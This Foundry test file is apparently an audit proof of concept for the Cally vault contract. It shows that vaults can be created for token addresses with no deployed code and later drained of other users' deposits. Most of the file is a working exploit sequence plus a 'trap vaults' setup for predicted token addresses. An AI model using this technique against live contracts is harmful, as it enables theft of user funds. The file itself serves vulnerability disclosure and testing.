// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../shared/Fixture.t.sol";
import "src/Cally.sol";

/**
 * @title ExploitTest - PoC for Non-Existent Token Address Vulnerability
 * @notice This test demonstrates how an attacker can exploit the lack of code existence
 *         checks in solmate's SafeTransferLib to steal tokens from future depositors.
 *
 * VULNERABILITY DESCRIPTION:
 * The createVault() function uses solmate's SafeTransferLib which does NOT check if the
 * token address has code deployed. This differs from OpenZeppelin's SafeERC20 which does
 * perform this check. As a result:
 *
 * 1. An attacker can create vaults for non-existent token addresses (no code deployed)
 * 2. The transferFrom call silently succeeds even though no tokens are transferred
 * 3. When a token is later deployed at that address (common for cross-chain deployments),
 *    the attacker can withdraw tokens deposited by legitimate users
 *
 * ATTACK SCENARIO:
 * 1. Attacker creates vault for non-existent TokenB address with 10000e18 tokens
 * 2. No actual tokens are transferred (address has no code), but vault is created
 * 3. Later, TokenB is deployed at the predicted address
 * 4. Alice creates a legitimate vault with 11000e18 TokenB tokens
 * 5. Attacker calls initiateWithdraw() and withdraw() to steal 10000e18 TokenB
 *
 * ROOT CAUSE:
 * solmate's SafeTransferLib delegates the responsibility of checking code existence
 * to the caller, but createVault() does not perform this check.
 */
contract ExploitTest is Test, Fixture {

    address attacker;
    address alice;

    // This will be the address where TokenB will be deployed
    address futureTokenAddress;

    function setUp() public {
        attacker = address(0xbad);
        alice = address(0xa11ce);

        vm.label(attacker, "Attacker");
        vm.label(alice, "Alice");

        // Calculate a future token address (simulating a predictable deployment address)
        // In reality, this could be calculated based on deployer address and nonce
        futureTokenAddress = address(0x1234567890123456789012345678901234567890);
        vm.label(futureTokenAddress, "FutureTokenB");
    }

    /**
     * @notice Main exploit test demonstrating the vulnerability
     * @dev This test shows how an attacker can create a vault for a non-existent token
     *      and later steal tokens when the token is deployed at that address
     */
    function testExploitNonExistentTokenVault() public {
        // ============================================
        // STEP 1: Attacker creates vault for non-existent token
        // ============================================
        vm.startPrank(attacker);

        // Verify the token address has no code deployed
        assertEq(futureTokenAddress.code.length, 0, "Token address should have no code initially");

        // Attacker creates a vault claiming to deposit 10000e18 tokens
        // This succeeds even though no tokens exist at this address
        uint256 attackerVaultId = c.createVault(
            10000e18,
            futureTokenAddress,
            2,  // premiumIndex
            1,  // durationDays
            0,  // dutchAuctionStartingStrikeIndex
            0,  // dutchAuctionReserveStrike
            Cally.TokenType.ERC20
        );

        // Verify the vault was created with the claimed amount
        assertEq(c.vaults(attackerVaultId).tokenIdOrAmount, 10000e18, "Attacker vault created");
        assertEq(c.vaults(attackerVaultId).token, futureTokenAddress, "Vault references future token");

        vm.stopPrank();

        // ============================================
        // STEP 2: Token is deployed at the predicted address
        // ============================================
        // Simulate token deployment by deploying MockERC20 at the future address
        MockERC20 tokenB = new MockERC20("TokenB", "TKNB", 18);
        vm.etch(futureTokenAddress, address(tokenB).code);
        MockERC20 deployedToken = MockERC20(futureTokenAddress);

        // ============================================
        // STEP 3: Alice creates a legitimate vault with real tokens
        // ============================================
        vm.startPrank(alice);

        // Alice mints and approves tokens
        deployedToken.mint(alice, 11000e18);
        deployedToken.approve(address(c), 11000e18);

        // Alice creates a vault with real tokens
        c.createVault(
            11000e18,
            futureTokenAddress,
            2,  // premiumIndex
            1,  // durationDays
            0,  // dutchAuctionStartingStrikeIndex
            0,  // dutchAuctionReserveStrike
            Cally.TokenType.ERC20
        );

        // Verify Alice's tokens were actually transferred
        assertEq(deployedToken.balanceOf(alice), 0, "Alice's tokens transferred");
        assertEq(deployedToken.balanceOf(address(c)), 11000e18, "Cally holds Alice's tokens");

        vm.stopPrank();

        // ============================================
        // STEP 4: Attacker withdraws, stealing Alice's tokens
        // ============================================
        vm.startPrank(attacker);

        // Attacker initiates withdrawal and warps time
        c.initiateWithdraw(attackerVaultId);
        vm.warp(block.timestamp + 2 days);

        // Attacker withdraws, receiving tokens that were actually deposited by Alice
        assertEq(deployedToken.balanceOf(attacker), 0, "Attacker has no tokens before");

        c.withdraw(attackerVaultId);

        // ============================================
        // EXPLOIT VERIFICATION
        // ============================================
        // The attacker successfully withdrew 10000e18 tokens without ever depositing any
        assertEq(
            deployedToken.balanceOf(attacker),
            10000e18,
            "EXPLOIT SUCCESS: Attacker stole 10000e18 tokens"
        );

        // The contract now has only 1000e18 tokens left (11000 - 10000)
        assertEq(
            deployedToken.balanceOf(address(c)),
            1000e18,
            "Contract lost tokens to attacker"
        );

        vm.stopPrank();

        // ============================================
        // IMPACT DEMONSTRATION: Alice loses funds
        // ============================================
        vm.startPrank(alice);

        // Alice tries to withdraw but will only get back 1000e18 instead of 11000e18
        // This demonstrates the direct financial loss to Alice

        vm.stopPrank();
    }

    /**
     * @notice Test showing the vault creation succeeds for non-existent token
     * @dev This is the core issue - no code existence check is performed
     */
    function testVaultCreationSucceedsForNonExistentToken() public {
        address nonExistentToken = address(0x9999999999999999999999999999999999999999);

        // Verify no code at address
        assertEq(nonExistentToken.code.length, 0, "Address should have no code");

        // Create vault should succeed despite no code at token address
        uint256 vaultId = c.createVault(
            1000e18,
            nonExistentToken,
            2,
            1,
            0,
            0,
            Cally.TokenType.ERC20
        );

        // Vault is created successfully
        Cally.Vault memory vault = c.vaults(vaultId);
        assertEq(vault.token, nonExistentToken, "Vault created for non-existent token");
        assertEq(vault.tokenIdOrAmount, 1000e18, "Vault has claimed amount");

        // This demonstrates the vulnerability: vault creation succeeds without
        // actually transferring any tokens because the token address has no code
    }

    /**
     * @notice Test demonstrating multiple trap vaults for different future tokens
     * @dev An attacker can set up multiple traps for various predicted token addresses
     */
    function testMultipleTrapVaults() public {
        address futureTokenA = address(0x1111111111111111111111111111111111111111);
        address futureTokenB = address(0x2222222222222222222222222222222222222222);
        address futureTokenC = address(0x3333333333333333333333333333333333333333);

        vm.startPrank(attacker);

        // Attacker creates trap vaults for multiple future tokens
        uint256 vaultA = c.createVault(5000e18, futureTokenA, 2, 1, 0, 0, Cally.TokenType.ERC20);
        uint256 vaultB = c.createVault(10000e18, futureTokenB, 2, 1, 0, 0, Cally.TokenType.ERC20);
        uint256 vaultC = c.createVault(15000e18, futureTokenC, 2, 1, 0, 0, Cally.TokenType.ERC20);

        // All vaults are created successfully
        assertEq(c.vaults(vaultA).token, futureTokenA, "Trap vault A created");
        assertEq(c.vaults(vaultB).token, futureTokenB, "Trap vault B created");
        assertEq(c.vaults(vaultC).token, futureTokenC, "Trap vault C created");

        vm.stopPrank();

        // When any of these tokens are deployed, the attacker can steal from future depositors
        // This demonstrates the scalability of the attack - one attacker can set many traps
    }
}
